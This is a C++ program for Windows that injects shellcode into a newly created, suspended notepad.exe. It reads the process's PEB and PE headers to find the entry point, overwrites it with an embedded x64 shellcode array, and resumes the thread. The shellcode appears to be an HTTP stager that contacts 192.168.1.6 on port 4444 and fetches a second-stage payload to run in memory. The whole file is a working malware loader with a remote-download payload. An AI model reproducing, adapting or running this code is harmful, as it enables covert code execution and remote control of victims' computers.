#include <iostream>
#include <windows.h>
#include <winternl.h> // Includes definitions for PEB and PROCESS_BASIC_INFORMATION

using namespace std;

// Define function pointer for ZwQueryInformationProcess since we load it dynamically
typedef NTSTATUS(NTAPI* pZwQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

int main(){
    
unsigned char shellcode[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x48\x31\xd2\x65\x48\x8b\x52\x60\x56\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x4d\x31\xc9\x48\x0f"
"\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41"
"\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x8b\x48\x18\x50\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88"
"\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x41\x58"
"\x48\x01\xd0\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x48\x31\xdb\x53\x49\xbe\x77\x69\x6e"
"\x69\x6e\x65\x74\x00\x41\x56\x48\x89\xe1\x49\xc7\xc2\x4c"
"\x77\x26\x07\xff\xd5\x53\x53\xe8\x70\x00\x00\x00\x4d\x6f"
"\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e"
"\x64\x6f\x77\x73\x20\x4e\x54\x20\x31\x30\x2e\x30\x3b\x20"
"\x57\x69\x6e\x36\x34\x3b\x20\x78\x36\x34\x29\x20\x41\x70"
"\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e"
"\x33\x36\x20\x28\x4b\x48\x54\x4d\x4c\x2c\x20\x6c\x69\x6b"
"\x65\x20\x47\x65\x63\x6b\x6f\x29\x20\x43\x68\x72\x6f\x6d"
"\x65\x2f\x31\x33\x31\x2e\x30\x2e\x30\x2e\x30\x20\x53\x61"
"\x66\x61\x72\x69\x2f\x35\x33\x37\x2e\x33\x36\x00\x59\x53"
"\x5a\x4d\x31\xc0\x4d\x31\xc9\x53\x53\x49\xba\x3a\x56\x79"
"\xa7\x00\x00\x00\x00\xff\xd5\xe8\x0c\x00\x00\x00\x31\x39"
"\x32\x2e\x31\x36\x38\x2e\x31\x2e\x36\x00\x5a\x48\x89\xc1"
"\x49\xc7\xc0\x5c\x11\x00\x00\x4d\x31\xc9\x53\x53\x6a\x03"
"\x53\x49\xba\x57\x89\x9f\xc6\x00\x00\x00\x00\xff\xd5\xe8"
"\x40\x00\x00\x00\x2f\x35\x4c\x35\x41\x73\x50\x2d\x68\x36"
"\x55\x6e\x39\x6c\x76\x79\x55\x6c\x47\x4d\x52\x46\x67\x73"
"\x41\x67\x6b\x47\x62\x6f\x58\x53\x4a\x38\x58\x36\x77\x79"
"\x38\x45\x39\x57\x54\x33\x61\x4e\x7a\x71\x52\x71\x2d\x71"
"\x4d\x61\x61\x65\x4c\x37\x35\x71\x46\x38\x39\x00\x48\x89"
"\xc1\x53\x5a\x41\x58\x4d\x31\xc9\x53\x48\xb8\x00\x32\xa8"
"\x84\x00\x00\x00\x00\x50\x53\x53\x49\xc7\xc2\xeb\x55\x2e"
"\x3b\xff\xd5\x48\x89\xc6\x6a\x0a\x5f\x48\x89\xf1\x6a\x1f"
"\x5a\x52\x68\x80\x33\x00\x00\x49\x89\xe0\x6a\x04\x41\x59"
"\x49\xba\x75\x46\x9e\x86\x00\x00\x00\x00\xff\xd5\x4d\x31"
"\xc0\x53\x5a\x48\x89\xf1\x4d\x31\xc9\x4d\x31\xc9\x53\x53"
"\x49\xc7\xc2\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x1f\x48"
"\xc7\xc1\x88\x13\x00\x00\x49\xba\x44\xf0\x35\xe0\x00\x00"
"\x00\x00\xff\xd5\x48\xff\xcf\x74\x02\xeb\xaa\xe8\x55\x00"
"\x00\x00\x53\x59\x6a\x40\x5a\x49\x89\xd1\xc1\xe2\x10\x49"
"\xc7\xc0\x00\x10\x00\x00\x49\xba\x58\xa4\x53\xe5\x00\x00"
"\x00\x00\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1"
"\x48\x89\xda\x49\xc7\xc0\x00\x20\x00\x00\x49\x89\xf9\x49"
"\xba\x12\x96\x89\xe2\x00\x00\x00\x00\xff\xd5\x48\x83\xc4"
"\x20\x85\xc0\x74\xb2\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75"
"\xd2\x58\xc3\x58\x6a\x00\x59\xbb\xe0\x1d\x2a\x0a\x41\x89"
"\xda\xff\xd5";

    // ---------------------------------------------------------
    // STEP 1: Create the target process in a suspended state
    // ---------------------------------------------------------

    STARTUPINFOA si = { 0 };
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED,
        NULL, NULL, &si, &pi))
    {
        cout << "[-] Failed to create process. Error: " << GetLastError() << endl;
        return 1;
    }

    cout << "[1] Created suspended 'notepad.exe' with ProcId " << pi.dwProcessId << endl;

    // ---------------------------------------------------------
    // STEP 2: Get the address of the Process Environment Block (PEB)
    // ---------------------------------------------------------

    // Load ntdll.dll to get ZwQueryInformationProcess
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pZwQueryInformationProcess ZwQueryInfoProcess =
        (pZwQueryInformationProcess)GetProcAddress(hNtdll, "ZwQueryInformationProcess");

    if (!ZwQueryInfoProcess) {
        cout << "[-] Could not resolve ZwQueryInformationProcess." << endl;
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength = 0;

    ZwQueryInfoProcess(
        pi.hProcess,
        (PROCESSINFOCLASS)0,
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    cout << "[2] PEB is at 0x" << hex << pbi.PebBaseAddress << endl;

    // ---------------------------------------------------------
    // STEP 3: Extract the Image Base Address from the PEB
    // ---------------------------------------------------------

    // In x64, the ImageBaseAddress is at PEB + 0x10.
    PVOID imageBaseAddress = 0;
    PVOID pebAddress = pbi.PebBaseAddress;
    PVOID ptrToImageBase = (PSTR)pebAddress + 0x10; // Pointer arithmetic
    SIZE_T bytesRead = 0;

    ReadProcessMemory(
        pi.hProcess,
        ptrToImageBase,
        &imageBaseAddress,
        sizeof(PVOID), // Reading a pointer (8 bytes on x64)
        &bytesRead
    );

    cout << "[3] Image Base Address is 0x" << hex << imageBaseAddress << endl;

    // ---------------------------------------------------------
    // STEP 4: Read the PE structure to find the EntryPoint address
    // ---------------------------------------------------------

    char buffer[0x200]; // Read first 512 bytes
    ReadProcessMemory(
        pi.hProcess,
        imageBaseAddress,
        buffer,
        0x200,
        &bytesRead
    );

    // Parse PE Headers to find EntryPoint
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD64)buffer + dosHeader->e_lfanew);

    // Calculate absolute entry point address
    DWORD entryPointRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;
    LPVOID entryPointAddress = (LPVOID)((DWORD64)imageBaseAddress + entryPointRVA);

    cout << "[4] Entry Point is 0x" << hex << entryPointAddress << endl;

    // ---------------------------------------------------------
    // STEP 5: Write shellcode at EntryPoint
    // ---------------------------------------------------------

    SIZE_T bytesWritten = 0;

    WriteProcessMemory(
        pi.hProcess,
        entryPointAddress,
        shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    cout << "[5] Wrote shellcode to Entry Point" << endl;

    // ---------------------------------------------------------
    // STEP 6: Resume the target process
    // ---------------------------------------------------------

    ResumeThread(pi.hThread);

    cout << "[6] Resumed process thread" << endl;

    // Cleanup handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
